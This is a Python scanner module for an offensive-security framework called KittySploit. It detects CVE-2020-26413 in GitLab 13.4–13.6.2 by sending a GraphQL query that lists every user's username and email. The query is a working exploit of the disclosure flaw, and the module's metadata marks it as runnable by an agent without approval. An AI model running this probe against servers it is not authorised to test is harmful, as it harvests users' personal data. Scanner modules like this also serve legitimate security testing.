#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GitLab CE and EE 13."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gitlab CE/EE 13.4 - 13.6.2 - Information Disclosure Detection',
        'description': 'GitLab CE and EE 13.4 through 13.6.2 is susceptible to Information disclosure via GraphQL. User email is visible. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'hackerone', 'gitlab', 'exposure', 'enum', 'graphql', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gitlab.com/gitlab-org/gitlab/-/issues/244275',
            'https://gitlab.com/gitlab-org/cves/-/blob/master/2020/CVE-2020-26413.json',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-26413',
            'https://hackerone.com/reports/972355',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2020-26413',
    }

    def run(self):
        path = '/api/graphql'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n  "query": "{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }",\n  "variables": null,\n  "operationName": null\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"username":', '"avatarUrl":', '"node":',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='Gitlab CE/EE 13.4 - 13.6.2 - Information Disclosure detected', path=path)
            return True
        return False

